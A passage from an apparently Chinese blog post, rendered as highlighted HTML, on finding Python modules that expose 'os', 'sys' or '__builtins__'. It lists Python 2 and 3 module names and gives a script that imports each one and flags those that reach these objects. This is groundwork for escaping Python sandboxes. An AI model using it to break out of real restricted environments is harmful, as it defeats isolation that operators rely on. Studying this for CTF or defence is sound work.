class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ensurepip&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;ttk&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;exceptions&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;fpformat&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;urlparse&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;_sha&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;future_builtins&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;repr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;rfc822&#x27;</span>, <span class="hljs-string">&#x27;xmllib&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_nd&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;xmlrpclib&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span>, <span class="hljs-string">&#x27;robotparser&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;hotshot&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;htmlentitydefs&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;htmllib&#x27;</span>, <span class="hljs-string">&#x27;sets&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;sgmllib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;ihooks&#x27;</span>, <span class="hljs-string">&#x27;sha&#x27;</span><br>]<br><br>all_modules_3 = [<br>    <span class="hljs-string">&#x27;AptUrl&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;requests_unixsocket&#x27;</span>, <span class="hljs-string">&#x27;CommandNotFound&#x27;</span>, <span class="hljs-string">&#x27;apport&#x27;</span>, <span class="hljs-string">&#x27;hpmudext&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;Crypto&#x27;</span>, <span class="hljs-string">&#x27;apport_python_hook&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;DistUpgrade&#x27;</span>, <span class="hljs-string">&#x27;apt&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;HweSupportStatus&#x27;</span>, <span class="hljs-string">&#x27;apt_inst&#x27;</span>, <span class="hljs-string">&#x27;httplib2&#x27;</span>, <span class="hljs-string">&#x27;scanext&#x27;</span>, <span class="hljs-string">&#x27;LanguageSelector&#x27;</span>, <span class="hljs-string">&#x27;apt_pkg&#x27;</span>, <span class="hljs-string">&#x27;idna&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;NvidiaDetector&#x27;</span>, <span class="hljs-string">&#x27;aptdaemon&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;secrets&#x27;</span>, <span class="hljs-string">&#x27;PIL&#x27;</span>, <span class="hljs-string">&#x27;aptsources&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;secretstorage&#x27;</span>, <span class="hljs-string">&#x27;Quirks&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;UbuntuDrivers&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;selectors&#x27;</span>, <span class="hljs-string">&#x27;UbuntuSystemService&#x27;</span>, <span class="hljs-string">&#x27;asn1crypto&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;UpdateManager&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;ipaddress&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;asyncio&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;_asyncio&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;janitor&#x27;</span>, <span class="hljs-string">&#x27;simplejson&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;_blake2&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyring&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;_bootlocale&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;six&#x27;</span>, <span class="hljs-string">&#x27;_bz2&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;language_support_pkgs&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;_cffi_backend&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;launchpadlib&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;brlapi&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;socketserver&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;louis&#x27;</span>, <span class="hljs-string">&#x27;softwareproperties&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;speechd&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;lzma&#x27;</span>, <span class="hljs-string">&#x27;speechd_config&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;cairo&#x27;</span>, <span class="hljs-string">&#x27;macaroonbakery&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;_collections_abc&#x27;</span>, <span class="hljs-string">&#x27;certifi&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;_compat_pickle&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;_compression&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;_crypt&#x27;</span>, <span class="hljs-string">&#x27;chardet&#x27;</span>, <span class="hljs-string">&#x27;mako&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;markupsafe&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;statistics&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;_datetime&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;modual_test&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;_dbm&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;_dbus_bindings&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;_dbus_glib_bindings&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;nacl&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;_decimal&#x27;</span>, <span class="hljs-string">&#x27;concurrent&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;configparser&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;systemd&#x27;</span>, <span class="hljs-string">&#x27;_gdbm&#x27;</span>, <span class="hljs-string">&#x27;copyreg&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;cryptography&#x27;</span>, <span class="hljs-string">&#x27;oauth&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_imp&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;olefile&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;cups&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;cupsext&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;cupshelpers&#x27;</span>, <span class="hljs-string">&#x27;orca&#x27;</span>, <span class="hljs-string">&#x27;_lzma&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_markupbase&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;dbus&#x27;</span>, <span class="hljs-string">&#x27;pathlib&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;deb822&#x27;</span>, <span class="hljs-string">&#x27;pcardext&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_opcode&#x27;</span>, <span class="hljs-string">&#x27;debconf&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_operator&#x27;</span>, <span class="hljs-string">&#x27;debian&#x27;</span>, <span class="hljs-string">&#x27;pexpect&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;debian_bundle&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;_pickle&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_posixsubprocess&#x27;</span>, <span class="hljs-string">&#x27;defer&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_pydecimal&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;pkg_resources&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;typing&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;distro_info&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;ufw&#x27;</span>, <span class="hljs-string">&#x27;_sha1&#x27;</span>, <span class="hljs-string">&#x27;distro_info_test&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_sha3&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;urllib3&#x27;</span>, <span class="hljs-string">&#x27;_signal&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;usbcreator&#x27;</span>, <span class="hljs-string">&#x27;_sitebuiltins&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;problem_report&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;enum&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;venv&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;faulthandler&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;wadllib&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;ptyprocess&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_stat&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_string&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pyatspi&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;xdg&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_testbuffer&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;xkit&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;pygtkcompat&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_testimportmultiple&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;pymacaroons&#x27;</span>, <span class="hljs-string">&#x27;xmlrpc&#x27;</span>, <span class="hljs-string">&#x27;_testmultiphase&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;pyrfc3339&#x27;</span>, <span class="hljs-string">&#x27;xxlimited&#x27;</span>, <span class="hljs-string">&#x27;_thread&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;pytz&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;queue&#x27;</span>, <span class="hljs-string">&#x27;yaml&#x27;</span>, <span class="hljs-string">&#x27;_tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;gi&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;zipapp&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;gtweak&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_yaml&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;reportlab&#x27;</span>, <span class="hljs-string">&#x27;zope&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;reprlib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span><br>]<br><br>methods = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br><br>results = <span class="hljs-comment">&#123;&#125;</span><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">module</span> <span class="hljs-keyword">in</span> all_modules_3:<br>    results[<span class="hljs-keyword">module</span>] = <span class="hljs-comment">&#123;</span><br><span class="hljs-comment">        &#x27;flag&#x27;: 0,</span><br><span class="hljs-comment">        &#x27;result&#x27;: &#123;&#125;</span><br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        m = __import__(<span class="hljs-keyword">module</span>)<br>        attrs = dir(m)<br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">method</span> <span class="hljs-title function_">in</span> <span class="hljs-title function_">methods</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">method</span> <span class="hljs-title function_">in</span> <span class="hljs-title function_">attrs</span>:<br>                <span class="hljs-keyword">result</span> = <span class="hljs-string">&#x27;yes&#x27;</span><br>                results[<span class="hljs-keyword">module</span>][<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">result</span> = <span class="hljs-string">&#x27;no&#x27;</span><br><br>            results[<span class="hljs-keyword">module</span>][<span class="hljs-string">&#x27;result&#x27;</span>][<span class="hljs-keyword">method</span>] = <span class="hljs-title function_">result</span><br><br>    <span class="hljs-title function_">except</span> <span class="hljs-title function_">Exception</span> <span class="hljs-title function_">as</span> <span class="hljs-title function_">e</span>:<br>        print(e)<br><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">result</span> <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-keyword">if</span> results[<span class="hljs-keyword">result</span>][<span class="hljs-string">&#x27;flag&#x27;</span>]:<br>        print(<span class="hljs-string">&#x27;[+]&#x27;</span> + <span class="hljs-keyword">result</span>)<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[<span class="hljs-keyword">result</span>][<span class="hljs-string">&#x27;result&#x27;</span>]:<br>            print(<span class="hljs-string">&#x27;  [-]&#x27;</span> + r + <span class="hljs-string">&#x27;: &#x27;</span> + results[<span class="hljs-keyword">result</span>][<span class="hljs-string">&#x27;result&#x27;</span>][r])<br></code></pre></td></tr></table></figure></p>
+<p><code>all_modules_2</code>就是 2.x 的标准库，<code>all_modules_3</code> 就是 3.x 的标准库。</p>
+<p>结果相当多，这里就不贴了。这里注意一下，这个文件别命名为 <code>test.py</code>，如果命名为 test 会怎么样呢？可以先猜一猜，后面会给解释。</p>
